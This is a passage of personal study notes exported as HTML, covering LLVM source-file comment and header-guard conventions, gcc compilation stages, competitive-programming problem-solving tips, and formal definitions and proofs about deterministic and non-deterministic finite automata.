// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception
//
//===----------------------------------------------------------------------===//
///
/// \file
/// This file contains the declaration of the Instruction class, which is the
/// base class for all of the VM instructions.
///
//===----------------------------------------------------------------------===//
</code></pre>
<p>The <code>-*- C++ -*-</code> string on the first line is there to tell Emacs that the source file is a C++ file, not a C file (Emacs assumes .h files are C files by default).</p>
<p>Next line license.</p>
<p>The <code>///</code> are doxygen comments describing the purpose of the files.</p>
<p>Abstract for the file: first sentence or a paragraph beginning with <code>\brief</code>.</p>
<h3 id="header-guard"><a class="header" href="#header-guard">Header Guard</a></h3>
<p>Combination of <code>#ifndef</code> and <code>#define</code>. This is meant for protecting the linker against including the same function / class / whatever multiple times as it causes error during linking.</p>
<blockquote>
<p>Linker cannot determine which declaration to choose from the multiple definitions present, even if they are the same.</p>
</blockquote>
<p>The header file’s guard should be the all-caps path that a user of this header would #include, using ‘_’ instead of path separator and extension marker. For example, the header file llvm/include/llvm/Analysis/Utils/Local.h would be #include-ed as #include <code>llvm/Analysis/Utils/Local.h</code>, so its guard is <code>LLVM_ANALYSIS_UTILS_LOCAL_H</code>.</p>
<h4 id="classes-methods-and-global-functions"><a class="header" href="#classes-methods-and-global-functions">Classes, methods and global functions</a></h4>
<p>Single line comment explaining the purpose. If non-trivial, use Doxygen comment blocks.</p>
<p>For functions and methods, single line about what it does and a description of edge cases.</p>
<h4 id="commenting-1"><a class="header" href="#commenting-1">Commenting</a></h4>
<p>In general, C++ style comments. (//, ///). C style comments are useful if the comment strictly needs to be inline. Eg. <code>Object.emitName(/*Prefix=*/nullptr);</code></p>
<p>Don’t comment out large blocks of code. If extremely necessary, (for instance, to give a debugging example), use <code>#if 0</code> and <code>#endif</code>. Better than C style comments.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c"><a class="header" href="#c">C++</a></h1>
 <div class="epigraph">
<blockquote><p>Programming is not all the same. Normal written languages have different rhythms and idioms, right? Well, so do programming languages. The language called C is all harsh imperatives, almost raw computer-speak. The language called Lisp is like one long, looping sentence, full of subclauses, so long in fact that you usually forget what it was even about in the first place. The language called Erlang is just like it sounds: eccentric and Scandinavian. </p>
<footer>Robin Sloane</footer></blockquote>
</div>
<blockquote>
<p>Any valid C code is for most part also a valid C++ code. Some differences exist and they can be found by comparing <a href="https://devdocs.io/cpp/">this</a> and <a href="https://devdocs.io/c/">this</a>.</p>
</blockquote>
<div class="epigraph">
<blockquote><p>C++ is a horrible language. It's made more horrible by the fact that a lot of substandard programmers use it, to the point where it's much much easier to generate total and utter crap with it. </p>
<footer>Linus Torvalds, <cite>Message to gmane.comp.version-control.git mailing list</cite></footer></blockquote>
</div>
<h2 id="compiler-process"><a class="header" href="#compiler-process">Compiler Process</a></h2>
<p>gcc: GNU C Compiler</p>
<pre><code>c =&gt; preprocessed file =&gt; IR =&gt; Assembly Language(.s) =&gt; .o =&gt; Machine Code (0&amp;1)



gcc -E file.c #This gives the preprocessed file

gcc -S file.c #This produces the assembly file

$gcc -c file.c #This gives the machine code
</code></pre>
<p><code>gcc hello.c</code> compiles the code.</p>
<p><code>a.out</code> or <code>./a.out</code> executes the code.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cp_qs_models"><a class="header" href="#cp_qs_models">cp_qs_models</a></h1>
<p><a href="https://codeforces.com/problemset/problem/1884/C">line sweep algo</a></p>
<ul>
<li>If we have a line sweep problem, we can sort the events by x-coordinate and then process them in order.</li>
<li>This gives us the maximum number of, say, open intervals.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cp_qs_reading"><a class="header" href="#cp_qs_reading">cp_qs_reading</a></h1>
<ul>
<li>Think in terms of a math model.</li>
<li>Writing things down never hurts. It’s a good way to think.</li>
<li>Shorter = better.</li>
<li>Simpler = better.</li>
<li>Focus on constraints.</li>
<li>Nothing in the problem statement is irrelevant. (Except for the story.)</li>
<li>Find patterns.</li>
</ul>
<h2 id="how-to-come-up-with-solutions"><a class="header" href="#how-to-come-up-with-solutions">How to come up with solutions</a></h2>
<ul>
<li>Remember that brute force is a solution.</li>
<li>Think of the simplest solution. (It’s probably the best.)</li>
<li>Think of a solution that is slightly better than the simplest solution.</li>
<li>Think about special cases. (n = 1, n = 2, n = 3, n = 4, etc.)</li>
<li><em>Suppose I did find such a solution, what would it look like? What characteristics it would have? Can we toy around with such a solution so that it remains optimal?</em></li>
</ul>
<h2 id="on-the-correctness-of-algorithms"><a class="header" href="#on-the-correctness-of-algorithms">On the correctness of algorithms</a></h2>
<ul>
<li>
<p>Academic proofs usually tend to be as rigorous as possible, and are carefully verified by other experts in the field, to be objectively certain of its correctness. Clearly that is not a level of rigor you need while solving a Codeforces problem. You only need to prove it to yourself.</p>
</li>
<li>
<p>An easy way to sanity check your proof is. Think of every step you took while proving. If you wanted to justify to an opponent you were correct, what would the opponent try to argue against. If you think you can’t justify your reasoning over his to a jury without reasonable doubt, your proof needs to be more specific.</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cs2200"><a class="header" href="#cs2200">cs2200</a></h1>
<p>Types of grammar:</p>
<ol>
<li>Right linear</li>
<li>Context free</li>
<li>unrestricted</li>
</ol>
<p>Types of machine models:</p>
<ol>
<li>finite memory: finite automata, regex</li>
<li>finite memory with stack: pushdown automata</li>
<li>unrestricted: turing machines, post systems, λ calculus etc.</li>
</ol>
<p>There is a one to one correspondence for the numberings above.</p>
<blockquote>
<p>Gödel’s incompleteness theorem: No matter how strong a deductive system is,
there are always statements that are true but unprovable.</p>
</blockquote>
<h2 id="strings-and-sets"><a class="header" href="#strings-and-sets">Strings and Sets</a></h2>
<blockquote>
<p><em>Decision problem</em> is a function that has a one bit output: true or false,
1 or 0.</p>
</blockquote>
<p>To completely specify a decision problem, specify a set of possible inputs, and
the subset for which the output is true.</p>
<p>Encoding the input of a decision problem as a fixed finite length string is
possible over some fixed finite alphabet.</p>
<blockquote>
<p>A <strong>finite alphabet</strong> is any finite set. A finite length string is a
sequence of the elements.</p>
</blockquote>
<p>Set ops for two sets:</p>
<ul>
<li>Union</li>
<li>Intersection</li>
<li>Complement over set of all strings: Basically, it depends on the <strong>set of
all strings</strong> that is chosen and hence this is often written as
<data class="katex-src" value="\Sigma^* — A"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup><mtext>—</mtext><mi>A</mi></mrow><annotation encoding="application/x-tex">\Sigma^* — A</annotation></semantics></math></span></data> to emphasize this.</li>
<li>Concatenation of two sets: <data class="katex-src" value="AB = \{xy | x \in A; y \in B\}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>B</mi><mo>=</mo><mo stretchy="false">{</mo><mi>x</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo>∈</mo><mi>A</mi><mo separator="true">;</mo><mi>y</mi><mo>∈</mo><mi>B</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">AB = {xy | x \in A; y \in B}</annotation></semantics></math></span></data>.</li>
</ul>
<p>Set ops on one set:</p>
<ul>
<li><em>asterate</em> A<sup>*</sup> of a set. <data class="katex-src" value="A^* = \bigcup_{n\geq 0}A^n"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mo>∗</mo></msup><mo>=</mo><msub><mo>⋃</mo><mrow><mi>n</mi><mo>≥</mo><mn>0</mn></mrow></msub><msup><mi>A</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">A^* = \bigcup_{n\geq 0}A^n</annotation></semantics></math></span></data></li>
<li>A<sup>+</sup> of a set. <data class="katex-src" value="A^+ = \bigcup_{n \geq 1}A^n"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mo>+</mo></msup><mo>=</mo><msub><mo>⋃</mo><mrow><mi>n</mi><mo>≥</mo><mn>1</mn></mrow></msub><msup><mi>A</mi><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">A^+ = \bigcup_{n \geq 1}A^n</annotation></semantics></math></span></data>.</li>
</ul>
<h2 id="states-and-transitions"><a class="header" href="#states-and-transitions">States and transitions</a></h2>
<p>A <strong>state</strong> of a system gives all the relevant information of a system, like a
<em>snapshot</em>. <strong>Transitions</strong> are changes of states.</p>
<p>If both are finite, then the system is called a
<em>finite state transition</em> system. We model them using <em>finite automata</em>.</p>
<h3 id="deterministic-finite-automata"><a class="header" href="#deterministic-finite-automata">Deterministic Finite Automata</a></h3>
<p>Formally,</p>
<p><data class="katex-src" value="M = \left(Q,\Sigma,\delta,s,F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi>δ</mi><mo separator="true">,</mo><mi>s</mi><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">M = \left(Q,\Sigma,\delta,s,F\right)</annotation></semantics></math></span></data></p>
<ul>
<li><em>Q</em> is the finite set of states.</li>
<li><data class="katex-src" value="\Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span></data> is the finite set of the input <em>alphabet</em>.</li>
<li><data class="katex-src" value="\delta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>δ</mi></mrow><annotation encoding="application/x-tex">\delta</annotation></semantics></math></span></data> is the transition function that takes the current state and the
input <em>character</em> as the inputs and gives the next state as the output.</li>
<li><em>s</em> is the start state.</li>
<li><em>F</em> is the finite subset of <em>Q</em> that are acceptable as the final states.</li>
</ul>
<p>To extend the character input to a <em>string</em>, we define <data class="katex-src" value="\hat{\delta}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\delta}</annotation></semantics></math></span></data>
inductively as follows:</p>
<ul>
<li><data class="katex-src" value="\hat{\delta}\left(q, xa\right) = \delta\left(\hat{\delta}\left(q, x\right),&#10;  a\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>x</mi><mi>a</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>δ</mi><mrow><mo fence="true">(</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\delta}\left(q, xa\right) = \delta\left(\hat{\delta}\left(q, x\right),   a\right)</annotation></semantics></math></span></data></li>
<li><data class="katex-src" value="\hat{\delta}\left(q, \epsilon\right) = q"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>ϵ</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">\hat{\delta}\left(q, \epsilon\right) = q</annotation></semantics></math></span></data></li>
</ul>
<p>Where <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> is a <em>string</em>, <data class="katex-src" value="a"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span></data> is a character, and <data class="katex-src" value="\epsilon"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span></data> is the empty input.</p>
<p>These can also be translated to the finite state machines
<a href="notes/./csd.html#finite-state-machines">discussed here</a>.</p>
<p>A string <data class="katex-src" value="x"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span></data> is accepted by an automation <data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data> if</p>
<p><data class="katex-src" value="\hat{\delta}\left(s,x\right) \in F"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>s</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>∈</mo><mi>F</mi></mrow><annotation encoding="application/x-tex">\hat{\delta}\left(s,x\right) \in F</annotation></semantics></math></span></data></p>
<p>A <em>set</em> or a <em>language</em> accepted by <data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data> is the set of all strings
accepted by some automata <data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data>, also called <data class="katex-src" value="L(M)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(M)</annotation></semantics></math></span></data>. Any subset of <data class="katex-src" value="\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Sigma^*</annotation></semantics></math></span></data>
is said to be regular if it is accepted by some automaton <data class="katex-src" value="M"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></data>.</p>
<p><strong>Any</strong> <em>finite</em> subset of <data class="katex-src" value="\Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\Sigma^*</annotation></semantics></math></span></data> is regular (brute-force all strings).</p>
<blockquote>
<p>Proof that union of two regular languages is regular:</p>
</blockquote>
<p>Let DFA 1 be <data class="katex-src" value="\left(Q_1, \Sigma, \delta_1, s_1, F_1\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><msub><mi>Q</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><msub><mi>δ</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>F</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(Q_1, \Sigma, \delta_1, s_1, F_1\right)</annotation></semantics></math></span></data> and DFA 2 be
<data class="katex-src" value="\left(Q_2, \Sigma, \delta_2, s_2, F_2\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">(</mo><msub><mi>Q</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><msub><mi>δ</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>F</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\left(Q_2, \Sigma, \delta_2, s_2, F_2\right)</annotation></semantics></math></span></data></p>
<p>The final automata has the cartesian product of the two sets of states as the
set of states (Q), and the delta is also from Q1 x Q2 to Q1 x Q2. The set of
final states is <data class="katex-src" value="Q_1\times F_2 \cup Q_2 \times F_1"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Q</mi><mn>1</mn></msub><mo>×</mo><msub><mi>F</mi><mn>2</mn></msub><mo>∪</mo><msub><mi>Q</mi><mn>2</mn></msub><mo>×</mo><msub><mi>F</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Q_1\times F_2 \cup Q_2 \times F_1</annotation></semantics></math></span></data>. Also,
<data class="katex-src" value="\hat{\delta}\left(\left(s_1, s_2\right), w\right) =&#10;\left(\hat{\delta}\left(s_1, w\right),\hat{\delta}\left(s_2, w\right)\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mrow><mo fence="true">(</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>s</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>w</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>s</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>w</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mover accent="true"><mi>δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><msub><mi>s</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>w</mi><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\delta}\left(\left(s_1, s_2\right), w\right) = \left(\hat{\delta}\left(s_1, w\right),\hat{\delta}\left(s_2, w\right)\right)</annotation></semantics></math></span></data></p>
<blockquote>
<p>Proof the the complement of a regular language is also regular:</p>
</blockquote>
<p>All accepted final states become non-accepted, while all non-accepted final
states become accepted.</p>
<blockquote>
<p>Proof that the intersection of two regular languages is also regular:</p>
</blockquote>
<p>Using set properties (De Morgan’s Law), or instead follow the proof of
union and replace the final set with <data class="katex-src" value="F_1 \times F_2"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>×</mo><msub><mi>F</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">F_1 \times F_2</annotation></semantics></math></span></data>.</p>
<h3 id="non-deterministic-finite-automata"><a class="header" href="#non-deterministic-finite-automata">Non-deterministic Finite Automata</a></h3>
<p>A finite automata where the next state is not necessarily determined by the
current state, and the input symbol. It is effectively in a
state of <em>guessing</em>.</p>
<p>To show that an automata accepts a set <data class="katex-src" value="B"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span></data>, we argue that there exists a
lucky sequence of guesses that lead from the start state to an accept state
when the end of <data class="katex-src" value="x\in B"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">x\in B</annotation></semantics></math></span></data> is reached, but for any string outside the set,
it is impossible.</p>
<p>Formally,</p>
<p><data class="katex-src" value="M = \left(Q,\Sigma,\Delta,S,F\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence="true">(</mo><mi>Q</mi><mo separator="true">,</mo><mi mathvariant="normal">Σ</mi><mo separator="true">,</mo><mi mathvariant="normal">Δ</mi><mo separator="true">,</mo><mi>S</mi><mo separator="true">,</mo><mi>F</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">M = \left(Q,\Sigma,\Delta,S,F\right)</annotation></semantics></math></span></data></p>
<ul>
<li><em>Q</em> is the finite set of states.</li>
<li><data class="katex-src" value="\Sigma"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Σ</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span></data> is the finite set of the input <em>alphabet</em>.</li>
<li><data class="katex-src" value="\Delta"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span></data> is the transition function that takes the current state and the
input <em>character</em> as the inputs and gives the next state as the output.
In this case, there are <data class="katex-src" value="2^Q"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>Q</mi></msup></mrow><annotation encoding="application/x-tex">2^Q</annotation></semantics></math></span></data> possible outputs, instead of the
<data class="katex-src" value="Q"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span></data> possible outputs in case of DFA. Each output corresponds to a unique
element in the power set of <data class="katex-src" value="Q"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span></data>.</li>
<li><em>S</em> is the subset of acceptable states called the start states.</li>
<li><em>F</em> is the finite subset of <em>Q</em> that are acceptable as the final states.</li>
</ul>
<p>To define the acceptance, we use the following rules:</p>
<p><data class="katex-src" value="\hat{\Delta}\left(A,\epsilon\right) = A"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>ϵ</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>A</mi></mrow><annotation encoding="application/x-tex">\hat{\Delta}\left(A,\epsilon\right) = A</annotation></semantics></math></span></data></p>
<p><data class="katex-src" value="\hat{\Delta}\left(A, xa\right) = \bigcup_{q\in \hat{\Delta}\left(A,x\right)} &#10;\Delta\left(q,a\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mi>a</mi><mo fence="true">)</mo></mrow><mo>=</mo><munder><mo>⋃</mo><mrow><mi>q</mi><mo>∈</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow></mrow></munder><mi mathvariant="normal">Δ</mi><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\Delta}\left(A, xa\right) = \bigcup_{q\in \hat{\Delta}\left(A,x\right)}  \Delta\left(q,a\right)</annotation></semantics></math></span></data></p>
<p>Instead of the usual one state, we have the input to be a subset of the
possible state for <data class="katex-src" value="\hat{\Delta}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\Delta}</annotation></semantics></math></span></data>.</p>
<p>Acceptance happens when <data class="katex-src" value="x \in \Sigma^*"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><msup><mi mathvariant="normal">Σ</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">x \in \Sigma^*</annotation></semantics></math></span></data> satisfies <data class="katex-src" value="\hat{\Delta}&#10;\left(S,x\right) \cap F \neq \phi"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>S</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>∩</mo><mi>F</mi><mo mathvariant="normal">≠</mo><mi>ϕ</mi></mrow><annotation encoding="application/x-tex">\hat{\Delta} \left(S,x\right) \cap F \neq \phi</annotation></semantics></math></span></data></p>
<p>Proof for Deterministic and Non-deterministic Finite Automata being equivalent:</p>
<ul>
<li>First we prove that <data class="katex-src" value="\hat{\Delta}\left(A, xy\right) =&#10;  \hat{\Delta}\left(\hat{\Delta}\left(A, x\right), y\right)"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mi>y</mi><mo fence="true">)</mo></mrow><mo>=</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>y</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\Delta}\left(A, xy\right) =   \hat{\Delta}\left(\hat{\Delta}\left(A, x\right), y\right)</annotation></semantics></math></span></data></li>
</ul>
<p>Induction on |y|:</p>
<p>For |y| = 0, it is trivially true from the above equations.</p>
<p>Assume for |y| ≤ n,</p>
<p><data class="katex-src" value="&#10;\begin{align*}&#10;\hat{\Delta}\left(A, xya\right) &= \bigcup_{q\in \hat{\Delta}\left(A,xy\right)} &#10;\Delta\left(q,a\right) \\&#10;& = \bigcup_{q\in \hat{\Delta}\left(\hat{\Delta}\left(A,x\right),y\right)} &#10;\Delta\left(q,a\right) \\&#10;& = \hat{\Delta}\left(\hat{\Delta}\left(A,x\right),ya\right)&#10;\end{align*}&#10;"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mi>y</mi><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mrow><mi>q</mi><mo>∈</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mi>y</mi><mo fence="true">)</mo></mrow></mrow></munder><mi mathvariant="normal">Δ</mi><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><munder><mo>⋃</mo><mrow><mi>q</mi><mo>∈</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>y</mi><mo fence="true">)</mo></mrow></mrow></munder><mi mathvariant="normal">Δ</mi><mrow><mo fence="true">(</mo><mi>q</mi><mo separator="true">,</mo><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover><mrow><mo fence="true">(</mo><mi>A</mi><mo separator="true">,</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>y</mi><mi>a</mi><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex"> \begin{align*} \hat{\Delta}\left(A, xya\right) &amp;= \bigcup_{q\in \hat{\Delta}\left(A,xy\right)}  \Delta\left(q,a\right) \ &amp; = \bigcup_{q\in \hat{\Delta}\left(\hat{\Delta}\left(A,x\right),y\right)}  \Delta\left(q,a\right) \ &amp; = \hat{\Delta}\left(\hat{\Delta}\left(A,x\right),ya\right) \end{align*} </annotation></semantics></math></span></data></p>
<ul>
<li>Second, the function <data class="katex-src" value="\hat{\Delta}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="normal">Δ</mi><mo>^</mo></mover></mrow><annotation encoding="application/x-tex">\hat{\Delta}</annotation></semantics></math></span></data> commutes with the set union, i.e.,
